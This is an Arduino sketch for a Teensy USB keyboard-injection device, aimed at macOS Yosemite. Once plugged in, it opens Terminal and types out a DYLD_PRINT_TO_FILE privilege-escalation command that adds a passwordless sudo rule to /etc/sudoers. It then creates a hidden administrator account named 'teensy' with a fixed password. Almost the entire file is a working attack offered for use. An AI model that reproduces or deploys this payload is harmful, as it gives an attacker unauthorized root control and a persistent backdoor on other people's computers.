/* mac-get-root.ino
 * Works on Yosemite systems. Read a paper or something.
 * Creates a new user with root privs.
 */

// Constants
const int led = 13;
const int ds = 1000;

void setup() {
  delay(ds); // Give the computer a second to connect
  pinMode(led, OUTPUT); // Status light on!

  spotlight("Terminal");
  // Execute priv. escalation
  typeln("echo 'echo \"$(whoami) ALL=(ALL) NOPASSWD:ALL\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo -s");

  // Create a user with root priv
  typeln("MOSTRECENTUID=$(dscl . -list /Users UniqueID | awk '{print $2}' | sort -ug | tail -1)");
  typeln("dscl . -create /Users/teensy IsHidden 1");
  typeln("dscl . -create /Users/teensy UserShell /bin/bash");
  typeln("dscl . -create /Users/teensy RealName \"User\"");
  typeln("dscl . -create /Users/teensy UniqueID $((MOSTRECENTUID+1))");
  typeln("dscl . -create /Users/teensy PrimaryGroupID 80");
  typeln("dscl . -create /Users/teensy NFSHomeDirectory /Users/teensy");
  typeln("dscl . -passwd /Users/teensy teensy");
  typeln("dscl . -append /Groups/admin GroupMembership teensy");

  // Put cleanup here.

  cmd(KEY_Q);
}

void loop() {
  // Blink a lot - we're done!
  digitalWrite(led, HIGH);
  delay(ds);
  digitalWrite(led, LOW);
  delay(ds);
}

// Keyboard functions

void mod(int mod, int key) {
  Keyboard.press(mod);
  Keyboard.press(key);
  Keyboard.releaseAll();
  delay(ds);
}

void typeln(String cmd) {
  Keyboard.print(cmd);
  delay(ds);
  Keyboard.println("");
  delay(ds*2);
}


// Mac-specific functions

void spotlight(String application) {
  cmd(KEY_SPACE);
  typeln(application);
}

void cmd(int key) {
  mod(MODIFERKEY_GUI, key);
}
